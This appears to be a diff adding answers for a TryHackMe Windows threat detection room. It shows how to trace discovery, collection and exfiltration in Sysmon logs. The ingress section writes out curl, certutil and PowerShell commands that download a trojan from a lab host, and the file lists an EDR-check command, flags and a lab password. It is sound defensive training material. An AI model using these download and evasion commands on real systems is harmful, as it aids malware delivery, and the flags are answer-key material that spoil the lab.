@@ -3,6 +3,7 @@
 ## Table of Contents
 1. [Windows Logging for SOC](#windows-logging-for-soc)
 2. [Windows Threat Detection 1](#windows-threat-detection-1)
+3. [Windows Threat Detection 2](#windows-threat-detection-2)
 
 ## Windows Logging for SOC
 ### What is Logged
@@ -338,4 +339,109 @@
 3. To which other USB did the malware propagate?(Format: just the letter, e.g. X:)
 
     We can filter the Sysmon log by `Event ID` 11, which describes a file creation, and look at the `TargetFilename` field to find the USB drive to which the malware propagated. The answer is `F:`.
+
+
+## Windows Threat Detection 2
+### Discovery Overview
+1. Open CMD and type "net user Administrator". Which privileged group does the user belong to?
+
+    The user `Administrator` belongs to the `Administrators` group.
+
+2. Open Event Viewer and try to find your command in Sysmon logs. What is the "Image" field of the net command you just run?
+
+    We can go to `event viewer > Applications and Services Logs > Microsoft > Windows > Sysmon > Operational` and filter by `Event ID` 1, which describes a process creation. Then, we can look at the `CommandLine` field to find the command that we just run, which is `net user Administrator`. Finally, we can look at the `Image` field of the event to find the answer, which is `C:\Windows\System32\net.exe`.
+
+### Detecting Discovery
+1. Looking at Sysmon logs, what is the first command the invoice.pdf.exe executes?
+
+    We can filter the `ParentProcessId` field to find the process creation events that are created by `invoice.pdf.exe`.
+
+    ```xml
+    <QueryList>
+    <Query Id="0" Path="Microsoft-Windows-Sysmon/Operational">
+        <Select Path="Microsoft-Windows-Sysmon/Operational">*[EventData[Data[@Name='ParentProcessId']='5992']]</Select>
+    </Query>
+    </QueryList>
+    ```
+
+    The answer is `whoami`.
+
+2. Which command did the malware use to check the presence of MS Defender EDR?
+
+    We can still use the same filter as the previous question and look at the `CommandLine` field to find the command that the malware used to check the presence of MS Defender EDR, which is `cmd /c "tasklist /v | findstr MsSense.exe || echo No MS Defender EDR"`.
+
+3. To which domain did the malware send the discovered data?
+
+    We can filter by `ProcessId` of the malware and find `Event ID` 22, which describes a DNS query, to find to which domain did the malware send the discovered data.
+
+    ```xml
+    <QueryList>
+    <Query Id="0" Path="Microsoft-Windows-Sysmon/Operational">
+        <Select Path="Microsoft-Windows-Sysmon/Operational">*[EventData[Data[@Name='ProcessId']='5992']]</Select>
+    </Query>
+    </QueryList>
+    ```
+    The domain that the malware sent the discovered data is `exfil.beecz.cafe`.
+
+### Collection Overview
+1. What is the Facebook password that the user saved in Chrome? (Chrome menu > Passwords and autofill > Password Manager)
+
+    The Facebook password that the user saved in Chrome is `nsAghv51BBav90!`.
+
+2. Which interesting SSH key does the user store on disk? (Start your search from C:\Users\Administrator\)
+
+    The answer is `thm-access-database.key`.
+
+3. What is the secret PDF file explaining TryHackMe's internal network? (Look for the file on the Desktop, Downloads, and Documents)
+
+    The answer is `thm-network-diagram-2025.pdf`. We can find it in the Downloads folder.
+
+### Detecting Collection
+1. Looking at Sysmon logs, what directory does the stealer create?
+
+    We can filter by `ProcessId` of the malware and examine the logs. The directory that the stealer creates is `staging_58f1`.
+
+2. Which three file extensions does the malware search for? Format: Separate by comma in alphabetic order (e.g. bat, txt)
+
+    We can solve this by filtering by `ProcessId` of the malware and look at the `CommandLine` field to find which file extensions does the malware search for. The answer is `docx, pdf, xlsx`.
+
+3. Which PowerShell cmdlet does the malware use to get clipboard content?
+
+    We can filter by `ProcessId` of the malware and look at the `CommandLine` field to find which PowerShell cmdlet does the malware use to get clipboard content, which is `Get-ClipBoard`.
+
+4. Which domain does the malware exfiltrate the data to?
+
+    We can filter by `ProcessId` of the malware and find `Event ID` 22, which describes a DNS query, to find which domain does the malware exfiltrate the data to. The domain that the malware exfiltrate the data to is `collecteddata-storage-2025.s3.amazonaws.com`.
+
+### Ingress Tool Transfer
+1. Open the Chrome browser on the VM and navigate to the URL. What is the flag in the response?
+
+    The flag in the response is `THM{just_use_web_browser}`.
+
+2. Next, open CMD and download the file from the same URL using curl.exe. What is the flag in the response?
+
+    We can use this command to download the file using curl.exe:
+
+    ```cmd
+    curl.exe http://appsforfree.thm/trojan.exe
+    ```
+    The flag in the response is `THM{curl_is_cool}`.
+
+3. Continue with the same CMD and URL, but now using certutil.exe. What is the flag in the response?
+
+    We can use this command to download the file using certutil.exe:
+
+    ```cmd
+    certutil.exe -urlcache -f http://appsforfree.thm/trojan.exe 
+    ```
+    The flag in the response is `THM{abusing_certutil}`.
+
+4. Finally, download the same file using PowerShell IWR. What is the flag in the response?
+
+    We can use this command to download the file using PowerShell IWR:
+    
+    ```cmd
+    powershell -c "Invoke-WebRequest -Uri 'http://appsforfree.thm/trojan.exe' "
+    ```
+    The flag in the response is `THM{power_of_powershell}`.
 
